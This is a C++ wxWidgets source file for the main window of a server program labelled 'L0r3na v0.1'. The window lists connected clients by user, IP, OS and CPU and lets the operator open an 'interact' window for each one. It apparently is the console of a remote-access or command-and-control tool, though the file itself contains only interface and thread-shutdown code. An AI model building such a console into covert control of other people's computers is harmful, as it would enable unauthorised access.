#include "frame_client.hpp"
#include "server.hpp"

#include "headers.hpp"

extern Servidor* p_Servidor;

class MyFrame : public wxFrame{
    public:
        MyFrame();
    private:
        wxPanel *m_RPanel, *m_LPanel, *m_BPanel;
        wxButton* btn_Escuchar, * btn_Detener;
        wxMenu *menuFile, *menuHelp;
        
        wxSize p_BotonS = wxSize(100, 30);

        //Eventos
        void OnClickEscuchar(wxCommandEvent& event);
        void OnclickDetener(wxCommandEvent& event);
        void OnLimpiar(wxCommandEvent& event);

        void CrearLista(long flags, bool withText = true);
        void CrearControlesPanelIzquierdo();
        void OnExit(wxCommandEvent& event);
        void OnClose(wxCloseEvent& event);
        void OnAbout(wxCommandEvent& event);

        wxDECLARE_EVENT_TABLE();
};

wxBEGIN_EVENT_TABLE(MyFrame, wxFrame)
    EVT_BUTTON(EnumIDS::ID_Escuchar, MyFrame::OnClickEscuchar)
    EVT_BUTTON(EnumIDS::ID_Detener, MyFrame::OnclickDetener)
    EVT_BUTTON(EnumIDS::ID_LimpiarLog, MyFrame::OnLimpiar)
    EVT_CLOSE(MyFrame::OnClose)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyListCtrl, wxListCtrl)
    EVT_CONTEXT_MENU(MyListCtrl::OnContextMenu)
    EVT_MENU(EnumIDS::ID_Interactuar, MyListCtrl::OnInteractuar)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
    EVT_BUTTON(EnumIDS::ID_FrameClienteTest, FrameCliente::OnTest)
    EVT_CLOSE(FrameCliente::OnClose)
    EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
    EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
wxEND_EVENT_TABLE()

class MyApp : public wxApp {
public:
    MyFrame* frame = nullptr;
    bool OnInit() override;
};

wxIMPLEMENT_APP(MyApp);

bool MyApp::OnInit(){
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
    this->frame = new MyFrame();
    this->frame->Show(true);
    return true;
}

MyFrame::MyFrame()
    : wxFrame(nullptr, wxID_ANY, "Lorena")
{
    //Trace memory leak
    //_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
    //_CrtSetBreakAlloc(40404);
    //_CrtSetBreakAlloc(40403);
    //_CrtSetBreakAlloc(40402);

    p_Servidor = new Servidor();
    p_Servidor->m_listCtrl = nullptr;

    
    this->m_RPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(700, 450));
    
    this->m_LPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(110, 600));
    this->m_LPanel->SetBackgroundColour(wxColor(255,0,0)); // REMOVE AT THE END

    this->m_BPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(100, 150));
    this->m_BPanel->SetBackgroundColour(wxColor(0,255,0)); // REMOVE AT THE END

    
    //Crear lista
    this->CrearLista(wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES | wxEXPAND);
    wxBoxSizer *sizerlist = new wxBoxSizer(wxHORIZONTAL);

    sizerlist->Add(p_Servidor->m_listCtrl, 1, wxALL | wxEXPAND, 1);

    this->m_RPanel->SetSizer(sizerlist);

    
    //Crear controles panel izquierdo
    this->CrearControlesPanelIzquierdo();

    //Crear txt para log
    p_Servidor->m_txtLog->p_txtCtrl = new wxTextCtrl(this->m_BPanel, wxID_ANY, ":v\n", wxDefaultPosition, wxSize(100,150), wxTE_MULTILINE | wxTE_READONLY);
    wxBoxSizer *sizertxt = new wxBoxSizer(wxVERTICAL);

 
    sizertxt->Add(new wxButton(this->m_BPanel, EnumIDS::ID_LimpiarLog, "Limpiar Log", wxDefaultPosition, wxSize(100, 20)), 0, wxALL, 1);
    sizertxt->Add(p_Servidor->m_txtLog->p_txtCtrl, 1, wxALL | wxEXPAND, 1);
    this->m_BPanel->SetSizer(sizertxt);

    wxBoxSizer *sizer = new wxBoxSizer(wxHORIZONTAL);
    sizer->Add(this->m_LPanel, 0, wxALL, 2);

    wxBoxSizer *sizer2 = new wxBoxSizer(wxVERTICAL);
    sizer2->Add(this->m_RPanel, 1, wxEXPAND | wxALL, 2);
    sizer2->Add(this->m_BPanel, 0, wxEXPAND | wxALL, 2);

    sizer->Add(sizer2, 1, wxALL, 1);

    this->SetSizerAndFit(sizer);

    SetClientSize(900,600);
    SetSizeHints(920, 635, 920, 635);
    
    CreateStatusBar();
    SetStatusText("IDLE");
}

void MyFrame::CrearControlesPanelIzquierdo(){
    
    this->btn_Escuchar = new wxButton(this->m_LPanel, EnumIDS::ID_Escuchar, "Iniciar Servidor", wxDefaultPosition, this->p_BotonS);
    this->btn_Detener = new wxButton(this->m_LPanel, EnumIDS::ID_Detener, "Detener Servidor", wxDefaultPosition, this->p_BotonS);

    wxBoxSizer *m_paneSizer = new wxBoxSizer(wxVERTICAL);
    m_paneSizer->AddSpacer(20);    
    m_paneSizer->Add(this->btn_Escuchar, 0, wxALIGN_CENTER | wxALL, 3);
    m_paneSizer->Add(this->btn_Detener,0, wxALIGN_CENTER | wxALL, 3);
    
    this->btn_Detener->Enable(false);

    this->m_LPanel->SetSizerAndFit(m_paneSizer);

}

void MyFrame::CrearLista(long flags, bool withText){
    p_Servidor->m_listCtrl = new MyListCtrl(this->m_RPanel, wxID_ANY, wxDefaultPosition, wxSize(600, 300), flags | wxBORDER_THEME);
   
    wxListItem itemCol;
    itemCol.SetText("ID");
    itemCol.SetWidth(60);
    itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
    p_Servidor->m_listCtrl->InsertColumn(0, itemCol);

    itemCol.SetText("USUARIO");
    itemCol.SetWidth(160);
    p_Servidor->m_listCtrl->InsertColumn(1, itemCol);

    itemCol.SetText("IP");
    itemCol.SetWidth(120);
    p_Servidor->m_listCtrl->InsertColumn(2, itemCol);

    itemCol.SetText("SO");
    itemCol.SetWidth(140);
    p_Servidor->m_listCtrl->InsertColumn(3, itemCol);

    itemCol.SetText("CPU");
    itemCol.SetWidth(200);
    p_Servidor->m_listCtrl->InsertColumn(4, itemCol);
}

void MyFrame::OnClose(wxCloseEvent& event){
    wxMessageDialog dialog(this, "Seguro que quieres salir?", "Salir", wxCENTER | wxYES_NO | wxICON_QUESTION);

    switch (dialog.ShowModal()) {
    case wxID_NO:
        event.Veto();
        return;
    case wxID_YES:
        break;
    }  
    
    std::unique_lock<std::mutex> lock(p_Servidor->p_mutex);
    p_Servidor->p_Escuchando = false;
    for (auto it : p_Servidor->vc_Clientes) {
        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(it._id);
        if (temp) {
            temp->Close(true);
        }
    }
    lock.unlock();
    if (p_Servidor->thListener.joinable()) {
        p_Servidor->thListener.join();
    }
    if (p_Servidor->thPing.joinable()) {
        p_Servidor->thPing.join();
    }
    
    Sleep(500);

    delete p_Servidor;
    p_Servidor = nullptr;
    
    event.Skip();
}

void MyFrame::OnExit(wxCommandEvent& event) {
    Close(true);
}

void MyFrame::OnClickEscuchar(wxCommandEvent& event){
    if(p_Servidor->m_Iniciar()){
        p_Servidor->m_Handler();
        this->btn_Detener->Enable(true);
        this->btn_Escuchar->Enable(false);
        SetStatusText("Esperando clientes...");
    } else {
        //error();
        std::string strTmp = "Error escuchando ";
        strTmp.append(std::to_string(GetLastError()));
        p_Servidor->m_txtLog->LogThis(strTmp, LogType::LogError);
        SetStatusText("Error");
    }
}

void MyFrame::OnclickDetener(wxCommandEvent& event){
    //Bloquear acceso a la variable 
    
    p_Servidor->m_StopHandler();
    p_Servidor->m_JoinThreads();
    
    this->btn_Detener->Enable(false);
    this->btn_Escuchar->Enable(true);

    p_Servidor->m_CerrarConexiones();

    p_Servidor->m_listCtrl->DeleteAllItems();
    SetStatusText("IDLE");
}

void MyFrame::OnLimpiar(wxCommandEvent& event) {
    p_Servidor->m_txtLog->p_txtCtrl->Clear();
}

void MyFrame::OnAbout(wxCommandEvent& event){
    wxMessageBox(wxT("L0r3na v0.1"), wxT("About"));
    //long lFound = p_Servidor->m_listCtrl->FindItem(0, wxString("2"));
    //if(lFound != wxNOT_FOUND){
    //    p_Servidor->m_listCtrl->DeleteItem(lFound);
    //}
}


/*

g++ `wx-config --cppflags` wx.cpp -lwx_baseu-3.2 -lwx_baseu_net-3.2 -lwx_baseu_xml-3.2 -lwx_mswu_adv-3.2 -lwx_mswu_aui-3.2 -lwx_mswu_core-3.2 -lwx_mswu_gl-3.2 -lwx_mswu_html-3.2 -lwx_mswu_media-3.2 -lwx_mswu_propgrid-3.2 -lwx_mswu_qa-3.2 -lwx_mswu_ribbon-3.2 -lwx_mswu_richtext-3.2 -lwx_mswu_stc-3.2 -lwx_mswu_webview-3.2 -lwx_mswu_xrc-3.2

*/